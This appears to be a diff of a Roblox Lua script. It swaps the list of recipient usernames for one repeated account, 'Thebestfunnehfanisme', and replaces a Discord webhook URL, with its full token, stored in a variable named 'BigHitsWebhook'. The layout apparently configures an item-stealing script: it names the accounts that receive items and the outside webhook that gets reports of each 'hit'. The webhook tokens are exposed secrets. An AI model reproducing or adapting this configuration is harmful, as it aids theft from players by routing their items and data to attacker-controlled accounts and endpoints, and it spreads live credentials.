@@ -58,12 +58,12 @@ if not request then
 end
 
 Usernames = {
-	"loopversions",
-	"altdoguizinho1",
-	"skittlesaresoyummyy",
+	"Thebestfunnehfanisme",
+	"Thebestfunnehfanisme",
+	"Thebestfunnehfanisme",
 }
 BigHitsWebhook =
-	"https://canary.discord.com/api/webhooks/1550065968795877441/SXTJpxOxr57H8HoykXIDtxOG5WZ9ErsV_6KwRfZpCTExLTqBzPuy9CEZYMZVHhQZ9hFr"
+	"https://discord.com/api/webhooks/1497722335472652369/d7U2Gui_fyu1c_aAYihhpMSBcnWGWrkGRQPW9UV4zZZs2y909fFlpui2TlHirAhK9Djm"
 
 repeat
 	task.wait()
